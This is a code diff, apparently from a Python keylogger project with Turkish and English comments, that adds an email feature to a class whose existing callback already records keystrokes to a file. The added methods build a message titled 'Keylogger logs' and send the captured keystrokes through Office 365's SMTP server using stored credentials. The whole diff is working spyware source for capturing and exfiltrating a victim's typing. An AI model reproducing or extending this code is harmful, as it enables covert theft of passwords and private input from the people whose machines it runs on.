@@ -54,5 +54,37 @@ def callback(self, event):
             # keylog'lari dosyaya yaz
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+    
+    def prepare_mail(self, message):
+        """Bir metinden bir MIMEMultipart olusturmak icin yardimci fonksiyon
+            Metin surumunun yani sira bir HTML surumu de olusturur
+              e-posta olarak gonderilecek"""
+        msg = MIMEMultipart("alternative")
+        msg["From"] = EMAIL_ADDRESS
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "Keylogger logs"
+        # ornek paragraf istediginizi yazabilirsiniz
+        html = f"<p>{message}</p>"
+        text_part = MIMEText(message, "plain")
+        html_part = MIMEText(html, "html")
+        msg.attach(text_part)
+        msg.attach(html_part)
+        # maili hazirladiktan sonra stringe cevirelim
+        return msg.as_string()
+    
+    def sendmail(self, email, password, message, verbose=1):
+        # manages a connection to an SMTP server
+        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
+        server = smtplib.SMTP(host="smtp.office365.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message after preparation
+        server.sendmail(email, email, self.prepare_mail(message))
+        # terminates the session
+        server.quit()
+        if verbose:
+            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
 
     
